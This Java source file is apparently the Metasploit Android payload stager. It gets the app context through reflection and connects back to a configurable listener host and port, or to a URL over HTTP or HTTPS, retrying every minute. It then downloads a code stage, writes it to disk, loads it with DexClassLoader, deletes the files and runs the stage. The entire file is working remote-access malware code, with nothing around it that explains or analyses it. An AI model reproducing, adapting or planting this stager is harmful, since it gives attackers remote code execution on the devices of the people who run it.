package com.metasploit.stage;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.Socket;
import java.util.Random;

import javax.net.ssl.HttpsURLConnection;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;

import dalvik.system.DexClassLoader;

public class Payload {

	final static int URI_CHECKSUM_INITJ = 88;
	final static String AB = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	
	public static final String LHOST =  "XXXX127.0.0.1                       ";
	public static final String LPORT =  "YYYY4444                            ";
	public static final String URL =    "ZZZZ                                ";
	public static final String TRIALS = "TTTT                                ";
	public static Context context;
	static Random rnd = new Random();

	public static void start() {
		if (context == null) {
			try {
				final Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
				final Method currentApplication = activityThreadClass.getMethod("currentApplication");
				context = (Context) currentApplication.invoke(null, (Object[]) null);
				if (context == null) {
					Handler handler = new Handler(Looper.getMainLooper());
					handler.post(new Runnable() {
						@Override
						public void run() {
							Context application = null;
							try {
								application = (Context) currentApplication.invoke(null, (Object[]) null);
							} catch (Exception e) {
								e.printStackTrace();
							}
							if (application != null) {
								startWithContext(application);
							} else {
								startAsync();
							}
						}
					});
				} else {
					startWithContext(context);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			startWithContext(context);
		}
	}

	public static void startWithContext(Context context) {
		Payload.context = context.getApplicationContext();

		// Set the working directory somewhere writeable
		System.setProperty("user.dir", context.getFilesDir().getAbsolutePath());

		startAsync();
	}

	public static void startAsync() {
		new Thread() {
			@Override
			public void run() {
				// Execute the payload
				Payload.main(null);
			}
		}.start();
	}

	public static void main(String[] args) {

		int nTrials = Integer.parseInt(TRIALS.substring(4).trim());
		while (!startReverseConn() && nTrials-- > 0) {
			try {
				Thread.sleep(60000);
			} catch (InterruptedException e) {
			}
		}
	}

	private static boolean startReverseConn() {
		try {
			if (URL.substring(4).trim().length() == 0)
				reverseTCP();
			else
				reverseHTTP();

			return true;
		} catch (Exception e) {
			return false;
		}
	}

	static String randomString(int len) {
		StringBuilder sb = new StringBuilder(len);
		for (int i = 0; i < len; i++)
			sb.append(AB.charAt(rnd.nextInt(AB.length())));
		return sb.toString();
	}

	static int checksumText(String s) {
		int tmp = 0;
		for (int i = 0; i < s.length(); i++)
			tmp += (int) s.charAt(i);
		return tmp % 0x100;
	}

	private static void reverseHTTP() throws Exception {
		int checksum = 0;
		String URI;
		HttpURLConnection urlConn;

		String lurl = URL.substring(4).trim();

		while (true) {
			URI = randomString(4);
			checksum = checksumText(URI);
			if (checksum == URI_CHECKSUM_INITJ)
				break;
		}

		String FullURI = "/" + URI.toString();

		URL url = new URL(lurl + FullURI + "_" + randomString(16));

		if (lurl.startsWith("https")) {
			urlConn = (HttpsURLConnection) url.openConnection();
			Class.forName("com.metasploit.stage.PayloadTrustManager")
					.getMethod("useFor", new Class[] { URLConnection.class })
					.invoke(null, new Object[] { urlConn });
		} else
			urlConn = (HttpURLConnection) url.openConnection();

		urlConn.setDoInput(true);
		urlConn.setRequestMethod("GET");
		urlConn.connect();
		DataInputStream in = new DataInputStream(urlConn.getInputStream());

		loadStage(in, null, context, new String[] {});
		urlConn.disconnect();
	}

	private static void loadStage(DataInputStream in, OutputStream out,
			Context context, String[] parameters) throws Exception {

		String path = new File(".").getAbsolutePath();
		String filePath = path + File.separatorChar + "payload.jar";
		String dexPath = path + File.separatorChar + "payload.dex";

		// Read the class name
		int coreLen = in.readInt();
		byte[] core = new byte[coreLen];
		in.readFully(core);
		String classFile = new String(core);

		// Read the stage
		coreLen = in.readInt();
		core = new byte[coreLen];
		in.readFully(core);

		File file = new File(filePath);
		if (!file.exists()) {
			file.createNewFile();
		}
		FileOutputStream fop = new FileOutputStream(file);
		fop.write(core);
		fop.flush();
		fop.close();

		// Load the stage
		DexClassLoader classLoader = new DexClassLoader(filePath, path, path,
				Payload.class.getClassLoader());
		Class<?> myClass = classLoader.loadClass(classFile);
		final Object stage = myClass.newInstance();
		file.delete();
		new File(dexPath).delete();
		myClass.getMethod(
				"start",
				new Class[] { DataInputStream.class, OutputStream.class,
						Context.class, String[].class }).invoke(stage,
				new Object[] { in, out, context, new String[] {}, });
	}

	private static void reverseTCP() {
		try {
			String lhost = LHOST.substring(4).trim();
			String lport = LPORT.substring(4).trim();
			Socket msgsock = new Socket(lhost, Integer.parseInt(lport));
			DataInputStream in = new DataInputStream(msgsock.getInputStream());
			OutputStream out = new DataOutputStream(msgsock.getOutputStream());
			loadStage(in, out, context, new String[] {});

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
